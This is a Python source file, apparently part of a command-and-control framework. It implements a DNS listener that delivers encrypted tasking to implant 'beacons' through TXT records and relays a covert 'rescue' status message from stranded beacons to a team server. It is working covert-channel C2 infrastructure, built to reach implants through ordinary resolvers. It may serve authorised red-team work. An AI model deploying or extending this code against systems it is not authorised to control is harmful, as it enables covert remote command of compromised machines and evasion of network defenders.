"""An authoritative-looking DNS listener for the beacon's TXT channel.

This transport carries nothing upstream, with one exception. The ordinary
query is a bare TXT question for `<base32(agent_id)>.b.<zone>`: no payload
in the question, no registration over DNS and no `_send_result_dns` in the
client, so for tasking this listener has nothing to relay and asks the
team server instead.

The exception is the rescue. A beacon whose HTTPS, SMB and QUIC legs have
all failed has no upstream at all, and until this existed it could be
tasked forever while never saying why it was stuck. Such a beacon sends
`<p1>.<p2>.<base32(agent_id)>.r.<zone>`, whose two leading labels carry an
encrypted 14-byte record. That one goes to `relay`, exactly as the SMB and
QUIC listeners send theirs. Either way this listener holds no key and
decrypts nothing.

Instead it asks the team server for that agent's next tasking, already
wrapped, over `GET /api/v1/dns/<agent_id>` with a shared listener token,
and puts the opaque string it gets into a TXT record. The key never leaves
the server, which is the property the whole package rests on.

Two consequences an operator has to know, and both belong in the panel and
in docs/LISTENERS.md rather than only here:

  * A beacon reached only over DNS can receive commands and will never
    report a task's *result*. The result block in the client tries HTTPS,
    then SMB, then QUIC, and drops the result if none is enabled. What it
    can now report is why it is stuck -- once per exhaustion, over the
    rescue name above.
  * A task delivered this way is fire-and-forget. It leaves the queue on
    delivery, because a task that stayed would be handed out again at
    every check-in -- forever, since nothing over DNS ever acknowledges
    it. `shell reboot` on a loop is worse than a task whose outcome is
    unknown.

Stdlib only. The wire format is read from `beacon._dns_query`, which is
the only specification that exists.
"""

import base64
import logging
import socket
import struct
import threading
import time
from typing import List, Optional, Tuple

from .relay import fetch_tasking, relay

logger = logging.getLogger("raccoon.listeners.dns")

# The marker label that tells a rescue query from a tasking one. Copied
# from software/c2/dns_rescue.py rather than imported: a listener container
# carries this package and nothing else, and a test in test_dns_rescue
# compares the two.
_RESCUE_MARKER = "r"

_TYPE_TXT = 16
_CLASS_IN = 1

# A DNS message over UDP is capped at 512 bytes without EDNS0, and the
# client reads 4096. Staying under 512 for the whole message keeps this
# answerable by any resolver in the path rather than only by a direct
# query, which is what makes the channel work through real infrastructure.
_MAX_UDP = 512

# One TXT character-string cannot exceed 255 bytes. The client concatenates
# them, so a longer payload is split -- that is why it joins rather than
# taking the first.
_MAX_TXT_CHUNK = 255


class DnsListener:
    """Answer TXT queries for one zone with tasking from the team server."""

    max_query_bytes = 512

    def __init__(self, bind_host: str, bind_port: int, *, relay_url: str,
                 zone: str, listener_token: str, ttl: int = 1, sock=None):
        self.relay_url = relay_url
        self.zone = zone.strip(".").lower()
        self.listener_token = listener_token
        # A short TTL on purpose: tasking changes between check-ins, and a
        # resolver holding an answer would hand the beacon a stale task or
        # none at all.
        self.ttl = ttl
        # A pre-bound socket, for socket activation. systemd or dockerd
        # holds the privileged port and hands the descriptor over, so no
        # listener process ever needs the privilege to bind 53, 445 or
        # anything else below 1024 -- which is the property that keeps
        # these out of `cap_add`, `setcap` and sudo entirely.
        if sock is not None:
            self._sock = sock
        else:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind((bind_host, bind_port))
        self._sock.settimeout(0.2)
        self.address = self._sock.getsockname()
        self._seen = 0
        self._answered = 0
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread = None            # type: Optional[threading.Thread]

    # ── lifecycle ──

    def start(self) -> None:
        if self._thread is not None:
            raise RuntimeError("this listener is already serving")
        self._thread = threading.Thread(target=self.serve_forever,
                                        daemon=True)
        self._thread.start()

    def serve_forever(self) -> None:
        while not self._stop.is_set():
            try:
                data, addr = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            with self._lock:
                self._seen += 1
            try:
                answer = self._answer_for(data)
            except Exception as exc:
                # One malformed query must not take the service down for
                # every other beacon.
                logger.debug("dns: dropped a query from %s: %s", addr, exc)
                continue
            if answer is None:
                continue
            try:
                self._sock.sendto(answer, addr)
                with self._lock:
                    self._answered += 1
            except OSError as exc:
                logger.debug("dns: send to %s failed: %s", addr, exc)

    def shutdown(self) -> None:
        self._stop.set()
        try:
            self._sock.close()
        except OSError:
            pass
        if self._thread is not None:
            self._thread.join(timeout=2.0)
            self._thread = None

    # ── observable state ──

    def counters(self) -> dict:
        return {"queries_seen": self.queries_seen(),
                "answers_sent": self.answers_sent()}


    def queries_seen(self) -> int:
        with self._lock:
            return self._seen

    def answers_sent(self) -> int:
        with self._lock:
            return self._answered

    # ── the exchange ──

    def _answer_for(self, query: bytes) -> Optional[bytes]:
        if len(query) > self.max_query_bytes:
            return None
        parsed = _parse_query(query)
        if parsed is None:
            return None
        txn_id, name, qtype, question = parsed

        if qtype != _TYPE_TXT:
            # Not our channel. Answer with no records rather than an error,
            # so a resolver probing for A does not learn anything.
            return _build_answer(txn_id, question, [], self.ttl)

        # The one exception to this file's opening claim. A name carrying
        # the rescue marker has a payload in the question, which is what a
        # beacon with no upstream left uses to say why. It goes to the same
        # `relay` the SMB and QUIC listeners use, so this listener still
        # holds no key and still decrypts nothing.
        rescue = self._rescue_of(name)
        if rescue is not None:
            payload = relay(rescue, url=self.relay_url)
            if not payload:
                return _build_answer(txn_id, question, [], self.ttl)
            return _build_answer(txn_id, question, _txt_chunks(payload),
                                 self.ttl)

        agent_id = self._agent_of(name)
        if agent_id is None:
            return _build_answer(txn_id, question, [], self.ttl)

        payload = fetch_tasking(agent_id, url=self.relay_url,
                                token=self.listener_token)
        if not payload:
            return _build_answer(txn_id, question, [], self.ttl)
        return _build_answer(txn_id, question, _txt_chunks(payload), self.ttl)

    def _rescue_of(self, name: str) -> Optional[str]:
        """Reassemble `<p1>.<p2>.<id>.r.<zone>` into the base64 payload.

        `None` means "not a rescue", and every way of being malformed
        returns it -- a wrong label count, a label that is not base32, a
        name outside the zone. The caller then answers with no records,
        which is what it answers for an empty queue, so this cannot be used
        as an oracle for whether a guessed payload decrypted.

        The agent id is in the name but is not read here: the server
        recovers it from the decrypted payload, and this listener has no
        key with which to check that the two agree.
        """
        name = name.strip(".").lower()
        suffix = "." + _RESCUE_MARKER + "." + self.zone
        if not name.endswith(suffix):
            return None
        head = name[:-len(suffix)].split(".")
        if len(head) != 3:
            return None
        text = (head[0] + head[1]).upper()
        padded = text + "=" * (-len(text) % 8)
        try:
            return base64.b64encode(base64.b32decode(padded)).decode()
        except Exception:
            return None

    def _agent_of(self, name: str) -> Optional[str]:
        """Decode `<base32-id>.b.<zone>` back to the agent id.

        The client builds this as
        `base64.b32encode(agent.encode()).decode().rstrip("=").lower()`,
        so decoding means upper-casing and restoring the padding it
        stripped. A name outside the zone, or one that does not decode, is
        not from a beacon.
        """
        name = name.strip(".").lower()
        suffix = ".b." + self.zone
        if not name.endswith(suffix):
            return None
        label = name[:-len(suffix)]
        if not label or "." in label:
            return None
        padded = label.upper() + "=" * (-len(label) % 8)
        try:
            return base64.b32decode(padded).decode("ascii")
        except Exception:
            return None


def _parse_query(data: bytes) -> Optional[Tuple[int, str, int, bytes]]:
    """Pull the transaction id, the queried name and its type out of a query.

    Returns the question section verbatim too, because an answer has to
    echo it byte for byte.
    """
    if len(data) < 12:
        return None
    txn_id, flags, qdcount = struct.unpack("!HHH", data[:6])
    if flags & 0x8000:
        return None                      # a response, not a query
    if qdcount != 1:
        # The client asks one question. More than one is not this channel,
        # and zero has nothing to answer.
        return None

    offset = 12
    labels = []            # type: List[str]
    while True:
        if offset >= len(data):
            return None
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0:
            # A compression pointer in a question is malformed, and
            # following one is how a parser gets walked in a loop.
            return None
        offset += 1
        if offset + length > len(data):
            return None
        try:
            labels.append(data[offset:offset + length].decode("ascii"))
        except UnicodeDecodeError:
            return None
        offset += length
        if len(labels) > 32:
            return None

    if offset + 4 > len(data):
        return None
    qtype, qclass = struct.unpack("!HH", data[offset:offset + 4])
    if qclass != _CLASS_IN:
        return None
    question = data[12:offset + 4]
    return txn_id, ".".join(labels), qtype, question


def _txt_chunks(payload: str) -> List[bytes]:
    """Split a payload into TXT character-strings of at most 255 bytes."""
    raw = payload.encode("ascii")
    return [raw[i:i + _MAX_TXT_CHUNK]
            for i in range(0, len(raw), _MAX_TXT_CHUNK)]


def _build_answer(txn_id: int, question: bytes, chunks: List[bytes],
                  ttl: int) -> bytes:
    """An authoritative answer echoing the question, with 0 or 1 TXT record."""
    rdata = b"".join(struct.pack("B", len(c)) + c for c in chunks)
    ancount = 1 if chunks else 0
    # QR=1, AA=1 -- this listener is authoritative for the zone it answers
    # for, and saying otherwise invites a resolver to look elsewhere.
    flags = 0x8400
    header = struct.pack("!HHHHHH", txn_id, flags, 1, ancount, 0, 0)
    if not ancount:
        return header + question

    # The name is a pointer to the question's name at offset 12, which is
    # how every real nameserver writes it and keeps the message short.
    record = (b"\xc0\x0c"
              + struct.pack("!HHIH", _TYPE_TXT, _CLASS_IN, ttl, len(rdata))
              + rdata)
    message = header + question + record
    if len(message) > _MAX_UDP:
        # Truncated rather than silently oversized: a resolver would drop
        # an over-long UDP answer, and the beacon would see nothing with no
        # way to know why.
        logger.debug("dns: answer of %d bytes exceeds %d, truncating",
                     len(message), _MAX_UDP)
        header = struct.pack("!HHHHHH", txn_id, flags | 0x0200, 1, 0, 0, 0)
        return header + question
    return message
